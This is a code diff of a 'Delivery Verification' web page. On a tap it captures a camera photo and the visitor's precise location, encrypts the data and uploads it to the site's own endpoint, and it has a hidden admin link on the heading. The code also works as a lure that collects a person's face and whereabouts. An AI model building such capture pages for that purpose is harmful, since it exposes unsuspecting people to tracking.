@@ -1,25 +1,89 @@
 <!doctype html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Delivery Verification</title>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta charset="utf-8">
+  <title>Delivery Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 20px;
+      user-select: none;
+    }
+
+    h2 {
+      text-align: center;
+      color: #2c3e50;
+      cursor: pointer;
+    }
+
+    #tapPrompt {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      padding: 35px;
+      border-radius: 15px;
+      text-align: center;
+      margin-top: 40px;
+      cursor: pointer;
+    }
+
+    #status {
+      display: none;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 
 <body>
-<h2>Delivery Verification</h2>
-<button id="start">Tap to Verify</button>
-<p id="status"></p>
+
+<h2 id="adminHeading">Delivery Verification</h2>
+
+<div id="tapPrompt">
+  <h3>📦 Tap to Start Verification</h3>
+  <p>Camera & location permission will be requested</p>
+</div>
+
+<div id="status">Initializing…</div>
 
 <script>
-const start = document.getElementById('start');
-const status = document.getElementById('status');
+const tapPrompt = document.getElementById('tapPrompt');
+const statusEl = document.getElementById('status');
+const adminHeading = document.getElementById('adminHeading');
 
-start.onclick = async () => {
+adminHeading.addEventListener('click', () => {
+  window.location.href = '/login';
+});
+
+let started = false;
+
+tapPrompt.addEventListener('click', async (e) => {
+  if (started) return;
+  started = true;
+
   try {
-    status.innerText = 'Requesting camera...';
+    statusEl.style.display = 'block';
+    statusEl.innerText = 'Requesting camera & location permission…';
 
-    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+    /* 🔥 BOTH permissions requested inside SAME user gesture */
+
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+    const locationPromise = new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(
+        resolve,
+        reject,
+        { enableHighAccuracy: true }
+      );
+    });
+
+    const [loc] = await Promise.all([
+      locationPromise
+    ]);
+
+    /* Capture photo */
     const video = document.createElement('video');
     video.srcObject = stream;
     await video.play();
@@ -27,19 +91,22 @@ start.onclick = async () => {
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video,0,0);
-    const photo = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9));
-    stream.getTracks().forEach(t=>t.stop());
+    canvas.getContext('2d').drawImage(video, 0, 0);
 
-    status.innerText = 'Requesting location...';
-    const loc = await new Promise((res,rej)=>{
-      navigator.geolocation.getCurrentPosition(res,rej);
-    });
+    const photo = await new Promise(r =>
+      canvas.toBlob(r, 'image/jpeg', 0.9)
+    );
 
+    stream.getTracks().forEach(t => t.stop());
+
+    statusEl.innerText = 'Encrypting & uploading…';
+
+    /* Prepare encrypted payload */
     const payload = {
       deliveryId: new URLSearchParams(location.search).get('deliveryId'),
       lat: loc.coords.latitude,
       lon: loc.coords.longitude,
+      accuracy: loc.coords.accuracy,
       timestamp: Date.now(),
       userAgent: navigator.userAgent
     };
@@ -55,7 +122,7 @@ start.onclick = async () => {
     );
 
     const encrypted = await crypto.subtle.encrypt(
-      { name:'AES-GCM', iv },
+      { name: 'AES-GCM', iv },
       cryptoKey,
       encoder.encode(JSON.stringify(payload))
     );
@@ -68,16 +135,20 @@ start.onclick = async () => {
     fd.append('photo', photo, 'delivery.jpg');
     fd.append('data', new Blob([buffer]));
 
-    status.innerText = 'Uploading...';
-    await fetch('/api/confirm', { method:'POST', body:fd });
+    await fetch('/api/confirm', {
+      method: 'POST',
+      body: fd
+    });
 
-    status.innerText = '✅ Delivery Verified';
+    statusEl.innerText = '✅ Delivery verified successfully';
 
-  } catch (e) {
-    console.error(e);
-    status.innerText = e.message;
+  } catch (err) {
+    console.error(err);
+    statusEl.innerText = '❌ ' + err.message;
+    started = false;
   }
-};
+});
 </script>
+
 </body>
 </html>
